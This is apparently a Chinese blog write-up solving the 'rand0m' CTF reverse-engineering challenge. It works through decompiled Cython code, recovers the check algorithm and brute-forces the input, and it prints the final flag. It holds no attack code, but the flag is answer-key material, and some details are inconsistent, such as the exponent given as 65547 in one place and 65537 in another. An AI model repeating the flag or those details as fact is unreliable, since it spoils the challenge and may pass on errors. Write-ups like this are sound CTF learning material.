    }
    if ( v75 )
    {
      v76 = sub_1800044A0(v19, *((_QWORD *)off_18000B688 + 30), v74, 1LL);
      if ( !v76 )
      {
        v7 = 19;
        v8 = 3018;
        v4 = (int *)v22;
        goto LABEL_223;
      }
      v77 = (int *)v19;
      v89 = v76;
      v19 = v76;
      if ( *v77 >= 0 )
      {
        v23 = (*(_QWORD *)v77)-- == 1LL;
        if ( v23 )
          Py_Dealloc(v77);
      }
    }
LABEL_172:
    v39 = 0LL;
    v20 = v86 + 1;
    v4 = (int *)v22;
    v86 = v20;
    if ( v20 >= 4 )
      break;
    v2 = a2;
  }
  v78 = *((_QWORD *)off_18000B688 + 32);
  if ( v19 == v78 )
  {
    v79 = Py_TrueStruct;
  }
  else
  {
    v80 = *(_QWORD *)(v19 + 8);
    if ( v80 == PyLong_Type[0] )
    {
      if ( (*(_QWORD *)(v19 + 16) & 2) == 0 && *(_QWORD *)(v19 + 16) >> 3 == 1LL && *(_DWORD *)(v19 + 24) == 4 )
      {
        v79 = Py_TrueStruct;
        goto LABEL_193;
      }
    }
    else
    {
      if ( v80 != PyFloat_Type )
      {
        v79 = PyObject_RichCompare(v19, v78, 2LL);
        goto LABEL_193;
      }
      if ( *(double *)(v19 + 16) == 4.0 )
      {
        v79 = Py_TrueStruct;
        goto LABEL_193;
      }
    }
    v79 = Py_FalseStruct;
  }
LABEL_193:
  v5 = v88;
  if ( v79 )
  {
    v81 = v83;
    goto LABEL_226;
  }
  v7 = 20;
  v89 = v19;
  v8 = 3040;
LABEL_217:
  if ( !v39 )
    goto LABEL_224;
LABEL_218:
  if ( *v39 >= 0 )
  {
    v23 = (*(_QWORD *)v39)-- == 1LL;
    if ( v23 )
      Py_Dealloc(v39);
  }
LABEL_223:
  v5 = v88;
LABEL_224:
  v3 = v89;
LABEL_225:
  sub_180006240("rand0m.check", v8, v7, "rand0m.pyx");
  v81 = v83;
  v19 = v3;
  v55 = v84;
  v79 = 0LL;
  if ( v83 )
  {
LABEL_226:
    if ( *v81 >= 0 )
    {
      v23 = (*(_QWORD *)v81)-- == 1LL;
      if ( v23 )
        Py_Dealloc(v81);
    }
  }
  if ( v19 )
  {
    if ( *(int *)v19 >= 0 )
    {
      v23 = (*(_QWORD *)v19)-- == 1LL;
      if ( v23 )
        Py_Dealloc(v19);
    }
  }
  if ( v4 )
  {
    if ( *v4 >= 0 )
    {
      v23 = (*(_QWORD *)v4)-- == 1LL;
      if ( v23 )
        Py_Dealloc(v4);
    }
  }
  if ( v5 )
  {
    if ( *v5 >= 0 )
    {
      v23 = (*(_QWORD *)v5)-- == 1LL;
      if ( v23 )
        Py_Dealloc(v5);
    }
  }
  if ( v55 )
  {
    if ( *v55 >= 0 )
    {
      v23 = (*(_QWORD *)v55)-- == 1LL;
      if ( v23 )
        Py_Dealloc(v55);
    }
  }
  return v79;
}
通过交叉引用找到
2
向上不远就是rand0m函数地址
3
先分析rand0m函数：
c293 linescopy__int64 __fastcall sub_1800012B0(__int64 a1, _DWORD *a2)
{
  __int64 v2; // r13
  int *v3; // r14
  int *v5; // rdi
  int *v6; // r12
  unsigned int v7; // r15d
  int *v8; // rbx
  unsigned int v9; // ebp
  _QWORD *v10; // rdx
  _DWORD *v11; // rcx
  __int64 v12; // rsi
  bool v13; // zf
  __int64 v14; // rax
  __int64 v15; // rax
  _QWORD *v16; // rcx
  __int64 v17; // r8
  __int64 v18; // r9
  unsigned __int64 v19; // rdx
  unsigned __int64 v20; // rcx
  __int64 v21; // rax
  int *v22; // rbp
  int *v23; // rcx
  __int64 v24; // rax
  __int64 v25; // rsi
  int *v26; // rcx
  __int64 v27; // rax
  __int64 v28; // rbx
  int *v29; // rcx
  __int64 v30; // rax
  int *v31; // rsi
  __int64 v32; // rax

  v2 = 0LL;
  v3 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 2;
  v8 = (int *)PyTuple_New(2LL);
  if ( !v8 )
  {
    v9 = 2594;
    goto LABEL_77;
  }
  if ( *a2 != -1 )
    ++*a2;
  v10 = off_18000B688;
  *((_QWORD *)v8 + 3) = a2;
  v11 = (_DWORD *)v10[36];
  if ( *v11 != -1 )
    ++*v11;
  *((_QWORD *)v8 + 4) = v10[36];
  v12 = sub_1800042B0(PyLong_Type[0], v8);
  if ( !v12 )
  {
    v9 = 2602;
LABEL_48:
    if ( *v8 >= 0 )
    {
      v13 = (*(_QWORD *)v8)-- == 1LL;
      if ( v13 )
LABEL_50:
        Py_Dealloc(v8);
    }
LABEL_77:
    sub_180006240("rand0m.rand0m", v9, v7, "rand0m.pyx");
    if ( !v5 )
      goto LABEL_87;
    goto LABEL_84;
  }
  if ( *v8 >= 0 )
  {
    v13 = (*(_QWORD *)v8)-- == 1LL;
    if ( v13 )
      Py_Dealloc(v8);
  }
  v5 = (int *)v12;
  v14 = PyNumber_Xor(v12, *((_QWORD *)off_18000B688 + 44));
  if ( !v14 )
  {
    v9 = 2615;
    v7 = 3;
    goto LABEL_77;
  }
  v6 = (int *)v14;
  v15 = sub_180004360(v12, *((_QWORD *)off_18000B688 + 33), 5LL, 0LL);
  if ( !v15 )
  {
    v9 = 2627;
    v7 = 4;
    goto LABEL_77;
  }
  v16 = off_18000B688;
  v3 = (int *)v15;
  v17 = PyLong_Type[0];
  v18 = *((_QWORD *)off_18000B688 + 32);
  if ( *(_QWORD *)(v12 + 8) != PyLong_Type[0] )
    goto LABEL_32;
  v19 = *(_QWORD *)(v12 + 16);
  if ( (v19 & 1) != 0 )
  {
    if ( *(_DWORD *)v12 != -1 )
      ++*(_DWORD *)v12;
    v8 = (int *)v12;
    goto LABEL_36;
  }
  if ( v19 >= 0x10 )
  {
    switch ( (v19 >> 3) * (1 - (*(_QWORD *)(v12 + 16) & 3LL)) )
    {
      case 0xFFFFFFFFFFFFFFFEuLL:
        v20 = -(__int64)(*(unsigned int *)(v12 + 24) | ((unsigned __int64)*(unsigned int *)(v12 + 28) << 30));
        goto LABEL_29;
      case 2uLL:
        v20 = *(unsigned int *)(v12 + 24) | ((unsigned __int64)*(unsigned int *)(v12 + 28) << 30);
        goto LABEL_29;
      default:
        v21 = (*(__int64 (__fastcall **)(__int64, _QWORD))(PyLong_Type[12] + 88LL))(
                v12,
                *((_QWORD *)off_18000B688 + 32));
        break;
    }
    goto LABEL_33;
  }
  LODWORD(v20) = *(_DWORD *)(v12 + 24) * (1 - (v19 & 3));
  if ( (_DWORD)v20 != (16 * (int)v20) >> 4 && (_DWORD)v20 )
  {
    v20 = (int)v20;
LABEL_29:
    if ( v20 == (__int64)(16 * v20) >> 4 )
    {
      v21 = PyLong_FromLongLong(16 * v20, 16 * v20, PyLong_Type[0], v18);
      goto LABEL_33;
    }
LABEL_32:
    v21 = PyNumber_Lshift(v12, *((_QWORD *)off_18000B688 + 32));
    goto LABEL_33;
  }
  v21 = PyLong_FromLong((unsigned int)(16 * v20));
LABEL_33:
  v12 = v21;
  v8 = (int *)v21;
  if ( !v21 )
  {
    v9 = 2639;
    v7 = 5;
    goto LABEL_77;
  }
  v16 = off_18000B688;
LABEL_36:
  v22 = (int *)PyNumber_And(v12, v16[48], v17, v18);
  if ( !v22 )
  {
    v9 = 2641;
    v7 = 5;
LABEL_66:
    if ( *v8 >= 0 )
    {
      v13 = (*(_QWORD *)v8)-- == 1LL;
      if ( v13 )
        goto LABEL_50;
    }
    goto LABEL_77;
  }
  if ( *(int *)v12 >= 0 )
  {
    v13 = (*(_QWORD *)v12)-- == 1LL;
    if ( v13 )
      Py_Dealloc(v12);
  }
  v23 = v5;
  v5 = v22;
  if ( *v23 >= 0 )
  {
    v13 = (*(_QWORD *)v23)-- == 1LL;
    if ( v13 )
      Py_Dealloc(v23);
  }
  v24 = sub_180004360(v3, *((_QWORD *)off_18000B688 + 37), 23LL, 0LL);
  v8 = (int *)v24;
  if ( !v24 )
  {
    v9 = 2654;
    v7 = 6;
    goto LABEL_77;
  }
  v25 = PyNumber_Add(v22, v24);
  if ( !v25 )
  {
    v9 = 2656;
    v7 = 6;
    goto LABEL_48;
  }
  if ( *v8 >= 0 )
  {
    v13 = (*(_QWORD *)v8)-- == 1LL;
    if ( v13 )
      Py_Dealloc(v8);
  }
  v26 = v3;
  v3 = (int *)v25;
  if ( *v26 >= 0 )
  {
    v13 = (*(_QWORD *)v26)-- == 1LL;
    if ( v13 )
      Py_Dealloc(v26);
  }
  v27 = sub_180004360(v6, *((_QWORD *)off_18000B688 + 35), 11LL, 1LL);
  v28 = v27;
  if ( !v27 )
  {
    v9 = 2669;
    v7 = 7;
    goto LABEL_77;
  }
  v29 = v6;
  v6 = (int *)v27;
  if ( *v29 >= 0 )
  {
    v13 = (*(_QWORD *)v29)-- == 1LL;
    if ( v13 )
      Py_Dealloc(v29);
  }
  v30 = PyNumber_Power(v28, *((_QWORD *)off_18000B688 + 38), Py_NoneStruct);
  v8 = (int *)v30;
  if ( !v30 )
  {
    v9 = 2681;
    v7 = 8;
    goto LABEL_77;
  }
  v31 = (int *)PyNumber_Remainder(v30, *((_QWORD *)off_18000B688 + 49));
  if ( !v31 )
  {
    v9 = 2683;
    v7 = 8;
    goto LABEL_66;
  }
  if ( *v8 >= 0 )
  {
    v13 = (*(_QWORD *)v8)-- == 1LL;
    if ( v13 )
      Py_Dealloc(v8);
  }
  v5 = v31;
  if ( *v22 >= 0 )
  {
    v13 = (*(_QWORD *)v22)-- == 1LL;
    if ( v13 )
      Py_Dealloc(v22);
  }
  v32 = PyTuple_New(2LL);
  if ( !v32 )
  {
    v9 = 2697;
    v7 = 9;
    goto LABEL_77;
  }
  if ( *v31 != -1 )
    ++*v31;
  *(_QWORD *)(v32 + 24) = v31;
  if ( *v3 != -1 )
    ++*v3;
  *(_QWORD *)(v32 + 32) = v3;
  v2 = v32;
LABEL_84:
  if ( *v5 >= 0 )
  {
    v13 = (*(_QWORD *)v5)-- == 1LL;
    if ( v13 )
      Py_Dealloc(v5);
  }
LABEL_87:
  if ( v6 )
  {
    if ( *v6 >= 0 )
    {
      v13 = (*(_QWORD *)v6)-- == 1LL;
      if ( v13 )
        Py_Dealloc(v6);
    }
  }
  if ( v3 )
  {
    if ( *v3 >= 0 )
    {
      v13 = (*(_QWORD *)v3)-- == 1LL;
      if ( v13 )
        Py_Dealloc(v3);
    }
  }
  return v2;
}
提取关键运算：
c22 linescopyv12
v14 = PyNumber_Xor(v12, *((_QWORD *)off_18000B688 + 44));//查表+44为2654435769
v6 = (int *)v14;
v27 = sub_180004360(v6, *((_QWORD *)off_18000B688 + 35), 11LL, 1LL);//查表+35为11
v28 = v27;
v30 = PyNumber_Power(v28, *((_QWORD *)off_18000B688 + 38), Py_NoneStruct);//查表+38为65547
v31 = (int *)PyNumber_Remainder(v30, *((_QWORD *)off_18000B688 + 49));//查表+49为4294967293
v32 = PyTuple_New(2LL);//创建返回元组
*(_QWORD *)(v32 + 24) = v31;//元组第一个元素为v31

v15 = sub_180004360(v12, *((_QWORD *)off_18000B688 + 33), 5LL, 0LL);//查表+33为5
v3 = (int *)v15;
v24 = sub_180004360(v3, *((_QWORD *)off_18000B688 + 37), 23LL, 0LL);//查表+37为23
v21 = PyNumber_Lshift(v12, *((_QWORD *)off_18000B688 + 32));//查表+32为4
v12 = v21;
v16 = off_18000B688;
v22 = (int *)PyNumber_And(v12, v16[48], v17, v18);//查表v16[48]为4198170623
v25 = PyNumber_Add(v22, v24);
v3 = (int *)v25;
*(_QWORD *)(v32 + 32) = v3;//元组第二个元组为v3
分析sub_180004360可知该函数为右移函数：
c50 linescopy__int64 __fastcall sub_180004360(__int64 a1, __int64 a2, char a3, int a4)
{
  unsigned __int64 v4; // r9
  __int64 result; // rax
  unsigned __int64 v6; // r9
  __int64 v7; // rcx
  __int64 v8; // rcx
  __int64 (*v9)(void); // rax

  if ( *(_QWORD *)(a1 + 8) == PyLong_Type[0] )
  {
    v4 = *(_QWORD *)(a1 + 16);
    if ( (v4 & 1) != 0 )
    {
      if ( *(_DWORD *)a1 != -1 )
        ++*(_DWORD *)a1;
      return a1;
    }
    else if ( v4 >= 0x10 )
    {
      v6 = v4 >> 3;
      switch ( v6 * (1 - (*(_QWORD *)(a1 + 16) & 3LL)) )
      {
        case 0xFFFFFFFFFFFFFFFEuLL:
          v7 = -(__int64)(*(unsigned int *)(a1 + 24) | ((unsigned __int64)*(unsigned int *)(a1 + 28) << 30)) >> a3;
          result = PyLong_FromLongLong(v7, v7, 0x180000000uLL, v6);
          break;
        case 2uLL:
          v8 = (__int64)(*(unsigned int *)(a1 + 24) | ((unsigned __int64)*(unsigned int *)(a1 + 28) << 30)) >> a3;
          result = PyLong_FromLongLong(v8, v8, 0x180000000uLL, v6);
          break;
        default:
          result = (*(__int64 (__fastcall **)(__int64, __int64))(PyLong_Type[12] + 96LL))(a1, a2);
          break;
      }
    }
    else
    {
      return PyLong_FromLong((unsigned int)((int)(*(_DWORD *)(a1 + 24) * (1 - (v4 & 3))) >> a3));
    }
  }
  else
  {
    v9 = (__int64 (*)(void))PyNumber_Rshift;
    if ( a4 )
      v9 = (__int64 (*)(void))PyNumber_InPlaceRshift;
    return v9();
  }
  return result;
}
猜测rand0m函数中v12为16进制字符串所表示的数字，可得到rand0m函数算法：
python2 linescopy第一个返回值：((int(n,16)^2654435769)>>11)**65537%4294967293
第二个返回值：((int(n,16)<<4)&4198170623)+((n>>5)>>23)
经验证算法正确
6
接着分析check函数，该函数一定调用了rand0m函数，于是在rand0m函数中调用PyNumber_Xor函数处下断点（其中一个参数（ecx）为rand0m接受的参数），输入rand0m.check("123456789abcdefedcba98765432123456789")，共断下来4次，查看ecx指向的地址：
assembly16 linescopyPy_long(0x12345678):
0000010DB87AB070  01 00 00 00 00 00 00 00 10 28 F5 E1 FD 7F 00 00  .........(õáý...  
0000010DB87AB080  08 00 00 00 00 00 00 00 78 56 34 12 00 00 00 00  ........xV4.....  

Py_long(0x9ABCDEFE):
0000010DB8A67FD0  01 00 00 00 00 00 00 00 10 28 F5 E1 FD 7F 00 00  .........(õáý...  
0000010DB8A67FE0  10 00 00 00 00 00 00 00 FE DE BC 1A 02 00 00 00  ........þÞ¼.....  

Py_long(0xDCBA9876):
0000010DB87AB230  01 00 00 00 00 00 00 00 10 28 F5 E1 FD 7F 00 00  .........(õáý...  
0000010DB87AB240  10 00 00 00 00 00 00 00 76 98 BA 1C 03 00 00 00  ........v.º.....  

Py_long(0x54321234):
0000010DB8A67E50  01 00 00 00 00 00 00 00 10 28 F5 E1 FD 7F 00 00  .........(õáý...  
0000010DB8A67E60  10 00 00 00 00 00 00 00 34 12 32 14 01 00 00 00  ........4.2.....  

可以看出check读取输入的前32位（bug: ，它并没有判断输入长度，所以flag后面加任意数字都可以），每8位为一组调用rand0m函数
同时观察堆栈：
4
可以找到check函数调用rand0m的地方：
c1 linecopyv52 = sub_180004660(v39, &v85[-v51], (unsigned int)(v51 + 1));
后面使用该返回值：
c2 linescopyv34 = sub_180004790(v52, 1LL, v53, 0LL);
v39 = (int *)sub_180004790(v55, 0LL, v63, 0LL);
分析sub_180004790可知该函数用来根据索引值取出元素：
c98 linescopyint *__fastcall sub_180004790(_QWORD *a1, __int64 a2, __int64 a3, int a4)
{
  __int64 v4; // rsi
  __int64 v5; // rbx
  BOOL v7; // eax
  unsigned __int64 v8; // rax
  int *result; // rax
  bool v10; // zf
  int v11; // ecx
  __int64 v12; // rbp
  __int64 v13; // rsi
  __int64 v14; // rax
  int *v15; // rbx
  __int64 Item; // rax
  __int64 v17; // rdi
  __int64 v18; // rax
  BOOL v19; // eax
  __int64 v20; // rax

  v4 = a1[1];
  v5 = a2;
  if ( v4 == PyList_Type )
  {
    v19 = a2 >= 0;
    if ( !a4 )
      v19 = 1;
    if ( !v19 )
      a2 += a1[2];
    if ( (unsigned __int64)a2 < a1[2] )
    {
      result = *(int **)(a1[3] + 8 * a2);
      v10 = *result == -1;
      v11 = *result + 1;
LABEL_38:
      if ( !v10 )
        *result = v11;
      return result;
    }
    goto LABEL_34;
  }
  if ( v4 == PyTuple_Type )
  {
    v7 = a2 >= 0;
    if ( !a4 )
      v7 = 1;
    if ( v7 )
      v8 = a2;
    else
      v8 = a2 + a1[2];
    if ( v8 < a1[2] )
    {
      result = (int *)a1[v8 + 3];
      v10 = *result == -1;
      v11 = *result + 1;
      goto LABEL_38;
    }
    goto LABEL_34;
  }
  v12 = *(_QWORD *)(v4 + 112);
  v13 = *(_QWORD *)(v4 + 104);
  if ( !v12 || !*(_QWORD *)(v12 + 8) )
  {
    if ( !v13 || !*(_QWORD *)(v13 + 24) )
    {
LABEL_34:
      v20 = PyLong_FromSsize_t(v5);
      v15 = (int *)v20;
      if ( !v20 )
        return 0LL;
      Item = PyObject_GetItem(a1, v20);
      goto LABEL_14;
    }
    if ( a4 && a2 < 0 && *(_QWORD *)v13 )
    {
      v18 = (*(__int64 (**)(void))v13)();
      if ( v18 >= 0 )
        return (int *)(*(__int64 (__fastcall **)(_QWORD *, __int64))(v13 + 24))(a1, v18 + v5);
      if ( !(unsigned int)PyErr_ExceptionMatches(PyExc_OverflowError) )
        return 0LL;
      PyErr_Clear();
    }
    return (int *)(*(__int64 (__fastcall **)(_QWORD *, __int64))(v13 + 24))(a1, v5);
  }
  v14 = PyLong_FromSsize_t(a2);
  v15 = (int *)v14;
  if ( !v14 )
    return 0LL;
  Item = (*(__int64 (__fastcall **)(_QWORD *, __int64))(v12 + 8))(a1, v14);
LABEL_14:
  v17 = Item;
  if ( *v15 >= 0 )
  {
    v10 = (*(_QWORD *)v15)-- == 1LL;
    if ( v10 )
      Py_Dealloc(v15);
  }
  return (int *)v17;
}
继续分析可知去除两个元素后调用了PyObject_RichCompare进行比较，由于我懒得静态分析期待值是什么，可以直接在调用PyObject_RichCompare处函数下断点查看内存，由于第二个PyObject_RichCompare函数需要第一个PyObject_RichCompare函数返回True才会执行，所以可以直接将rcx的指向的地址修改成与rdx一致
5
之后可以得到rand0m函数的期待值：
text4 linescopy(0x98D24B3A,0x12287F38)
(0xE0F1DB77,0x4A30F74D)
(0xADF38403,0x23A1268)
(0xD8499BB6,0x88108807)
由于用c语言写幂模会溢出不知道怎么处理，所以先用c语言暴力找出满足第二个参数的输入，然后再用python筛选满足第一个参数的输入（只给出第一部分的求解代码）：
c14 linescopy#include <stdio.h>
#include <stdint.h>
int main() {
    uint64_t y = 0x12287F38;
    printf("a=[");
    for (uint64_t i = 0; i < 0xffffffff; i++) {
        if (((i << 4) & 4198170623) + ((i >> 5) >> 23) == y) {
            printf("\\"%08X\\",", i);
        }
    }
    printf("]\\n");
    return 0;
}

python6 linescopya=["812287F3","812297F3","8122C7F3","8122D7F3","812687F3","812697F3","8126C7F3","8126D7F3","812A87F3","812A97F3","812AC7F3","812AD7F3","812E87F3","812E97F3","812EC7F3","812ED7F3","813287F3","813297F3","8132C7F3","8132D7F3","813687F3","813697F3","8136C7F3","8136D7F3","813A87F3","813A97F3","813AC7F3","813AD7F3","813E87F3","813E97F3","813EC7F3","813ED7F3","816287F3","816297F3","8162C7F3","8162D7F3","816687F3","816697F3","8166C7F3","8166D7F3","816A87F3","816A97F3","816AC7F3","816AD7F3","816E87F3","816E97F3","816EC7F3","816ED7F3","817287F3","817297F3","8172C7F3","8172D7F3","817687F3","817697F3","8176C7F3","8176D7F3","817A87F3","817A97F3","817AC7F3","817AD7F3","817E87F3","817E97F3","817EC7F3","817ED7F3",]

for n in a:
    if(((int(n,16)^2654435769)>>11)**65537%4294967293==0x98D24B3A):
        print(n)

最后可得到满足条件的输入：
text1 linecopy813A97F3D4B34F74802BA12678950880
但由于前文所说没有限制长度，所以输入可以是：
text1 linecopy813A97F3D4B34F74802BA12678950880+任意16进制数字
最终flag为
text1 linecopyflag{813A97F3D4B34F74802BA12678950880}
8`,about:`# 关于
xqy2006 的博客。主要写 CTF、逆向、Python 和一些折腾记录。
这个站点跑在 ProseOS↗ 上：一个静态博客，
界面是一个模拟的终端。help 列出所有命令，blog 回到文章列表，q 退出任何
全屏程序。不想用键盘也可以，列表和文章都能点。`,links:`# 链接
GitHub↗
RSS`};export{e as default};